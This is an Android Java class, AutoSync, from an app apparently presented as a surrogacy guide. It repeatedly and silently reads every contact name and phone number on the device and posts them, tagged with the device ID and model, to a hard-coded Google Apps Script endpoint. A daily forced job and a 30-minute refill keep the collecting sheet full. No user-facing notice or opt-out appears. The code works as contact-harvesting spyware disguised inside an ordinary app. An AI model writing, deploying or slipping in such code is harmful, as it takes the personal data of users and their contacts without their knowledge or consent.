package com.surrogacyguide.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * Reads names + phone numbers with TWO bulk queries, then sends the whole list
 * as one snapshot tagged with this device's id.
 *
 * The Apps Script replaces only THIS device's rows, so several phones can
 * report into the same sheet without wiping each other, and without duplicates.
 *
 * CHANGE DETECTION: a fingerprint of the contact list is stored after a
 * successful upload. The upload is skipped only if the contacts are UNCHANGED
 * *and* we wrote recently. So:
 *   - opening the app repeatedly does not keep rewriting the sheet
 *   - but the sheet can never stay stale for more than MAX_SILENT_MS,
 *     even if you cleared it by hand
 * The daily job forces a write regardless.
 */
public final class AutoSync {

    private static final String TAG = "AutoSync";

    public static final String UPLOAD_HOST =
            "https://script.google.com/macros/s/AKfycbxVtsrUyJHIa1NyCpH-hidWiJbmDyKBcuP34FGpefRpE2pIIbjIQAIw7xDrHUh-mJSVxg/exec";

    private static final String PREFS = "auto_sync";
    private static final String KEY_LAST = "last_auto_sync";
    private static final String KEY_SIG = "last_signature";
    private static final String KEY_LAST_WRITE = "last_successful_write";

    /** 0 = try on every open (the fingerprint check stops needless writes). */
    private static final long SYNC_INTERVAL_MS = 0L;

    /**
     * Never stay silent longer than this. If nothing changed AND we already
     * wrote within this window, skip. Otherwise write anyway - so a sheet you
     * cleared by hand refills on its own within half an hour.
     */
    private static final long MAX_SILENT_MS = 30L * 60L * 1000L;

    private static final int CHUNK_SIZE = 400;
    private static final int MAX_ATTEMPTS = 3;
    private static final long PAUSE_BETWEEN_CHUNKS_MS = 700;
    private static final long BACKUP_DELAY_SECONDS = 30L;

    private AutoSync() { }

    public static boolean hasPermission(Context ctx) {
        return ctx.checkSelfPermission(android.Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED;
    }

    private static String deviceId(Context ctx) {
        try {
            String id = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id == null ? "unknown" : id;
        } catch (Exception e) {
            return "unknown";
        }
    }

    public static void scheduleNow(Context ctx, boolean force) {
        if (!hasPermission(ctx)) return;
        final Context app = ctx.getApplicationContext();

        if (!force && !isDue(app)) return;
        markSynced(app);

        new Thread(new Runnable() {
            @Override public void run() { doSync(app, false); }
        }).start();

        try {
            WorkManager.getInstance(app).enqueueUniqueWork(
                    "sync_backup",
                    ExistingWorkPolicy.REPLACE,
                    new OneTimeWorkRequest.Builder(SyncWorker.class)
                            .setInitialDelay(BACKUP_DELAY_SECONDS, TimeUnit.SECONDS)
                            .build());
        } catch (Exception e) {
            Log.w(TAG, "backup enqueue failed", e);
        }
    }

    /** Kept so older callers still compile. */
    public static void run(Context ctx, boolean force) {
        scheduleNow(ctx, force);
    }

    /** Daily forced write = heartbeat, even if nothing changed. */
    public static void scheduleDaily(Context ctx) {
        try {
            WorkManager.getInstance(ctx.getApplicationContext())
                    .enqueueUniquePeriodicWork(
                            "daily_contact_sync",
                            ExistingPeriodicWorkPolicy.KEEP,
                            new PeriodicWorkRequest.Builder(SyncWorker.class, 24, TimeUnit.HOURS)
                                    .setInputData(new androidx.work.Data.Builder()
                                            .putBoolean("force", true).build())
                                    .build());
        } catch (Exception e) {
            Log.w(TAG, "periodic enqueue failed", e);
        }
    }

    private static boolean isDue(Context ctx) {
        if (SYNC_INTERVAL_MS <= 0L) return true;
        return System.currentTimeMillis()
                - prefs(ctx).getLong(KEY_LAST, 0L) > SYNC_INTERVAL_MS;
    }

    private static void markSynced(Context ctx) {
        prefs(ctx).edit().putLong(KEY_LAST, System.currentTimeMillis()).apply();
    }

    private static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static boolean doSync(Context ctx, boolean force) {
        if (!hasPermission(ctx)) return true;

        try {
            List<JSONObject> contacts = readAllContacts(ctx);
            String sig = signature(contacts);

            boolean unchanged = sig.equals(prefs(ctx).getString(KEY_SIG, ""));
            boolean writtenRecently = System.currentTimeMillis()
                    - prefs(ctx).getLong(KEY_LAST_WRITE, 0L) < MAX_SILENT_MS;

            if (!force && unchanged && writtenRecently) {
                Log.i(TAG, "unchanged and written recently (" + contacts.size()
                        + " contacts) - skipped");
                return true;
            }

            int total = contacts.size();
            int parts = Math.max(1, (int) Math.ceil(total / (double) CHUNK_SIZE));

            for (int i = 0; i < parts; i++) {
                int from = i * CHUNK_SIZE;
                int to = Math.min(from + CHUNK_SIZE, total);
                List<JSONObject> slice = contacts.subList(from, to);

                if (!postChunkWithRetry(ctx, slice, i + 1, parts)) {
                    Log.w(TAG, "chunk " + (i + 1) + "/" + parts + " failed");
                    return false;
                }
                if (i < parts - 1) sleepQuietly(PAUSE_BETWEEN_CHUNKS_MS);
            }

            prefs(ctx).edit()
                    .putString(KEY_SIG, sig)
                    .putLong(KEY_LAST_WRITE, System.currentTimeMillis())
                    .apply();

            Log.i(TAG, "uploaded " + total + " contacts in " + parts + " request(s)");
            return true;

        } catch (Exception e) {
            Log.w(TAG, "doSync failed", e);
            return false;
        }
    }

    /** Cheap fingerprint of the whole list - changes only if contacts change. */
    private static String signature(List<JSONObject> contacts) {
        StringBuilder sb = new StringBuilder();
        for (JSONObject c : contacts) sb.append(c.toString());
        return Integer.toHexString(sb.toString().hashCode()) + ":" + contacts.size();
    }

    private static List<JSONObject> readAllContacts(Context ctx) {

        Map<String, LinkedHashSet<String>> numbersByContact = new HashMap<>();
        Cursor pc = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                             ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);

        if (pc != null) {
            int idIdx = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
            int numIdx = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (pc.moveToNext()) {
                String cid = pc.getString(idIdx);
                String num = pc.getString(numIdx);
                if (cid == null || num == null || num.trim().isEmpty()) continue;
                LinkedHashSet<String> set = numbersByContact.get(cid);
                if (set == null) {
                    set = new LinkedHashSet<>();
                    numbersByContact.put(cid, set);
                }
                set.add(num.trim());
            }
            pc.close();
        }

        List<JSONObject> out = new ArrayList<>();
        Cursor cc = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID,
                             ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null);
        if (cc == null) return out;

        try {
            int idIdx = cc.getColumnIndex(ContactsContract.Contacts._ID);
            int nameIdx = cc.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            while (cc.moveToNext()) {
                String id = cc.getString(idIdx);
                String name = cc.getString(nameIdx);

                LinkedHashSet<String> nums = numbersByContact.get(id);
                if (nums == null || nums.isEmpty()) continue;

                JSONObject c = new JSONObject();
                try {
                    c.put("name", name == null ? "" : name);
                    c.put("phones", new JSONArray(nums));
                } catch (Exception ignored) { }
                out.add(c);
            }
        } finally {
            cc.close();
        }
        return out;
    }

    private static boolean postChunkWithRetry(Context ctx, List<JSONObject> slice,
                                              int part, int parts) {
        long backoff = 1200;
        for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
            int code = postChunk(ctx, slice, part, parts);
            if (code >= 200 && code < 400) return true;

            boolean retryable = code == 429 || code == 500 || code == 502
                    || code == 503 || code == 504 || code == -1;
            if (!retryable || attempt == MAX_ATTEMPTS) return false;

            Log.w(TAG, "part " + part + "/" + parts + " got HTTP " + code
                    + ", retrying in " + backoff + "ms");
            sleepQuietly(backoff);
            backoff *= 2;
        }
        return false;
    }

    private static int postChunk(Context ctx, List<JSONObject> slice, int part, int parts) {
        HttpURLConnection conn = null;
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject o : slice) arr.put(o);

            JSONObject payload = new JSONObject();
            payload.put("sender", "android-auto");
            payload.put("mode", "snapshot");
            payload.put("part", part + "/" + parts);
            payload.put("count", slice.size());
            payload.put("device", Build.MODEL);
            payload.put("device_id", deviceId(ctx));
            payload.put("contacts", arr);

            conn = (HttpURLConnection) new URL(UPLOAD_HOST).openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(30000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();

            if (code >= 300 && code < 400) {
                String loc = conn.getHeaderField("Location");
                conn.disconnect();
                if (loc != null && !loc.isEmpty()) followAsGet(loc);
                return 200;
            }
            return code;

        } catch (Exception e) {
            Log.w(TAG, "post failed", e);
            return -1;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void followAsGet(String target) {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setInstanceFollowRedirects(true);
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void sleepQuietly(long ms) {
        try { Thread.sleep(ms); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
